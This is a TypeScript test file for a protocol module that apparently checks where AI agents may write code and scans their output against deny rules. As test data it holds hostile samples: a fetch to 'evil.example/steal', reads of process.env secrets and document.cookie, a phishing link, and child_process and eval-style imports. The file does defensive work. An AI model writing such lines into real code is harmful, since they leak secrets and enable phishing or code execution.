// ui-check-ignore-file: the tests feed HTML snippets (a password field, a link) to the deny scan as test data
import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import { denyScan, parseArtifactDraft, parseChangeSet, parseDecision, parsePolicy, roleOfPath } from './protocol.ts';
import { PIPELINE_LIMITS } from './types.ts';

const file = (over: Record<string, unknown> = {}) => ({ path: 'sample-app/src/orders.ts', op: 'write', role: 'src', content: 'export const a = 1;', baseSha: null, ...over });

describe('where an agent may write', () => {
  test('only the three roots, with the role the place implies', () => {
    assert.equal(roleOfPath('sample-app/src/ui/List.tsx'), 'src');
    assert.equal(roleOfPath('sample-app/tests/orders.test.ts'), 'unit_test');
    assert.equal(roleOfPath('sample-app/e2e/orders.spec.ts'), 'e2e_test');
  });

  test('everything that is ours is refused: config, build files, the server shell, CI, hidden files, other folders', () => {
    for (const p of ['sample-app/package.json', 'sample-app/Dockerfile', 'sample-app/vite.config.ts', 'sample-app/server/index.ts', 'sample-app/ci/hermetic-test.sh', 'sample-app/smoke/run.mjs', '.github/workflows/ci.yml', 'src/App.tsx', 'sample-app/src/.env', 'sample-app/src/', 'sample-app/src/x.sh', 'sample-app/srcx/a.ts']) {
      assert.equal(roleOfPath(p), null, p);
    }
  });

  test('a path cannot climb out of its root or hide behind odd spelling', () => {
    for (const p of ['sample-app/src/../package.json', 'sample-app/src/a/../../x.ts', '/sample-app/src/a.ts', 'sample-app\\src\\a.ts', 'sample-app/src//a.ts', 'sample-app/src/a\0.ts', 'sample-app/src/./a.ts', 42, null, '']) {
      assert.equal(roleOfPath(p), null, String(p));
    }
  });
});

describe('a change set', () => {
  test('is cleaned and kept: line endings, a final newline, the role', () => {
    const out = parseChangeSet([file({ content: 'a\r\nb' })]);
    assert.ok(out);
    assert.equal(out[0].content, 'a\nb\n');
    assert.equal(out[0].baseSha, null);
  });

  test('a delete carries no content, and a write must', () => {
    assert.ok(parseChangeSet([file({ op: 'delete', content: '' })]));
    assert.equal(parseChangeSet([file({ op: 'delete', content: 'x' })]), null);
    assert.equal(parseChangeSet([file({ content: '' })]), null);
    assert.equal(parseChangeSet([file({ content: 5 })]), null);
  });

  test('the role must agree with the place, and a path appears once', () => {
    assert.equal(parseChangeSet([file({ role: 'unit_test' })]), null);
    assert.equal(parseChangeSet([file(), file()]), null);
    assert.equal(parseChangeSet([file({ path: 'sample-app/package.json' })]), null);
  });

  test('the sizes are held: files, lines, bytes, and a base hash that is a real sha256', () => {
    assert.equal(parseChangeSet([]), null);
    assert.equal(parseChangeSet(Array.from({ length: PIPELINE_LIMITS.files + 1 }, (_, i) => file({ path: `sample-app/src/f${i}.ts` }))), null);
    assert.equal(parseChangeSet([file({ content: Array.from({ length: PIPELINE_LIMITS.fileLines + 1 }, () => 'x').join('\n') })]), null);
    assert.equal(parseChangeSet([file({ baseSha: 'abc' })]), null);
    assert.ok(parseChangeSet([file({ baseSha: 'a'.repeat(64) })]));
  });
});

describe('what AI-written code may not do', () => {
  const scan = (content: string) => denyScan([{ path: 'sample-app/src/x.tsx', op: 'write', content }]);

  test('each rule fires on what it is for', () => {
    const bad: Record<string, string> = {
      'child_process': "import { exec } from 'child_process';",
      'node network or file modules': "import net from 'node:net';",
      'network call to an absolute address': "await fetch('https://evil.example/steal');",
      'eval or Function constructor': 'const f = new Function("return 1");',
      'dynamic import': 'const m = await import(url);',
      'process.env': 'const k = process.env.SECRET;',
      'password field': '<input type="password" />',
      'external link or asset': '<a href="https://phish.example">log in</a>',
      'navigation to an absolute address': 'window.open("https://x.example")',
      'raw HTML injection': '<div dangerouslySetInnerHTML={{ __html: h }} />',
      'cookies': 'const c = document.cookie;',
    };
    for (const [rule, code] of Object.entries(bad)) assert.ok(scan(code).some((f) => f.rule === rule), rule);
  });

  test('ordinary app code is left alone, and a relative fetch is fine', () => {
    assert.deepEqual(scan("const r = await fetch('/api/orders');\nexport const total = (xs: number[]) => xs.reduce((a, b) => a + b, 0);"), []);
    assert.deepEqual(scan('<a href="/orders/1">Open</a>\n<img src="/logo.svg" alt="" />'), []);
  });

  test('a finding says where, and a deleted file has nothing to scan', () => {
    const [f] = scan('ok\nconst k = process.env.X;');
    assert.equal(f.line, 2);
    assert.equal(f.path, 'sample-app/src/x.tsx');
    assert.deepEqual(denyScan([{ path: 'sample-app/src/x.ts', op: 'delete', content: '' }]), []);
  });
});

describe('what an agent hands back', () => {
  test('a spec needs a title and a body and carries no files', () => {
    assert.deepEqual(parseArtifactDraft({ kind: 'spec', title: ' Order export ', body: '## Acceptance\n- [ ] one' }), { kind: 'spec', title: 'Order export', body: '## Acceptance\n- [ ] one' });
    assert.equal(parseArtifactDraft({ kind: 'spec', title: '', body: 'x' }), null);
    assert.equal(parseArtifactDraft({ kind: 'spec', title: 't', body: 'x', files: [file()] }), null);
    assert.equal(parseArtifactDraft({ kind: 'nonsense', title: 't', body: 'x' }), null);
  });

  test('a change set needs valid files and its meta is cleaned', () => {
    assert.equal(parseArtifactDraft({ kind: 'change_set', title: 't', body: 'x' }), null);
    const ok = parseArtifactDraft({ kind: 'change_set', title: 't', body: 'x', files: [file()], meta: { noUi: true, bad_key: 1, 'Bad Key': 2, '1st': 3, note: 'hi' } });
    assert.ok(ok?.files?.length === 1);
    assert.deepEqual(ok?.meta, { noUi: true, bad_key: 1, note: 'hi' });
  });

  test('a decision is accepted or rejected, nothing else', () => {
    assert.equal(parseDecision({ decision: 'accepted' }), 'accepted');
    assert.equal(parseDecision({ decision: 'rejected' }), 'rejected');
    assert.equal(parseDecision({ decision: 'proceeded' }), null);
    assert.equal(parseDecision(null), null);
  });
});

describe('the thresholds an owner sets', () => {
  test('a few fields change and the rest keep their defaults', () => {
    const p = parsePolicy({ coverageMin: 85, rolloutPlan: [25, 100] });
    assert.equal(p?.coverageMin, 85);
    assert.deepEqual(p?.rolloutPlan, [25, 100]);
    assert.equal(p?.scanRequired, true);
  });

  test('anything out of range or of the wrong kind refuses the whole thing', () => {
    for (const bad of [{ coverageMin: 101 }, { coverageMin: '80' }, { errorRateMax: 2 }, { p95MsMax: 1 }, { scanMaxSeverity: 'EXTREME' }, { scanRequired: 'yes' }, { rolloutPlan: [10, 50] }, { rolloutPlan: [50, 10, 100] }, { rolloutPlan: [] }, null, 'x']) {
      assert.equal(parsePolicy(bad), null, JSON.stringify(bad));
    }
  });
});
